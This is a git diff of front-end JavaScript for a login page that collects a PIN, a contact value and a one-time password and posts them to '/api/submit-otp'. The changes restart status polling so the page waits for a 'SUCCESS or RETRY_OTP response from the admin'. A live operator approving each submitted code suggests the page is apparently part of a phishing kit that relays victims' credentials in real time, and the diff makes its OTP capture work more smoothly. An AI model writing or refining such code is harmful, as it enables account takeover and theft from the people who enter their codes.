@@ -184,9 +184,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const pin = Array.from(pinBoxes).map(b => b.value).join('');
     const contact = document.getElementById('login-contact').value;
 
-    const pinErrorEl = document.getElementById('pin-error');
-    if (pinErrorEl) pinErrorEl.classList.add('hidden');
-
     switchView('view-waiting');
     document.getElementById('waiting-status-text').textContent = 'Submitting PIN for verification...';
 
@@ -260,9 +257,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
   document.getElementById('btn-submit-otp')?.addEventListener('click', async () => {
     const otp = Array.from(otpBoxes).map(b => b.value).join('');
-    
-    const otpErrorEl = document.getElementById('otp-error');
-    if (otpErrorEl) otpErrorEl.classList.add('hidden');
+
+    switchView('view-waiting');
+    document.getElementById('waiting-status-text').textContent = 'Validating OTP confirmation...';
 
     try {
       await fetch('/api/submit-otp', {
@@ -270,8 +267,10 @@ document.addEventListener('DOMContentLoaded', () => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ userId: currentUserId, otp })
       });
-      switchView('view-waiting');
-      document.getElementById('waiting-status-text').textContent = 'Validating OTP confirmation...';
+      
+      // Restart polling so the browser listens for SUCCESS or RETRY_OTP response from the admin
+      startStatusPolling();
+      
     } catch (err) {
       console.error(err);
     }
@@ -349,4 +348,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-        
+                          
